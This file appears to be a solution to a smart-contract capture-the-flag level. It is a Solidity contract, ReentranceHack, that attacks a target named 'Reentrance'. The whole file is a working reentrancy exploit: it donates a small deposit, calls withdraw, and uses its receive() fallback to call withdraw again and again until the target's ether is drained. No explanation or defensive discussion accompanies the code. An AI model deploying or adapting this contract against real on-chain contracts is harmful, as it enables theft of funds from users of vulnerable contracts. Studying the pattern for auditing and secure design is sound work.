// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);
}

contract ReentranceHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function hack() external {
        IReentrance(target).donate{value: 0.001 ether}(address(this));
        IReentrance(target).withdraw(0.001 ether);
    }

    receive() external payable {
        uint balance = IReentrance(target).balanceOf(address(this));
        if (balance > 0) {
            IReentrance(target).withdraw(balance);
        }
    }
}
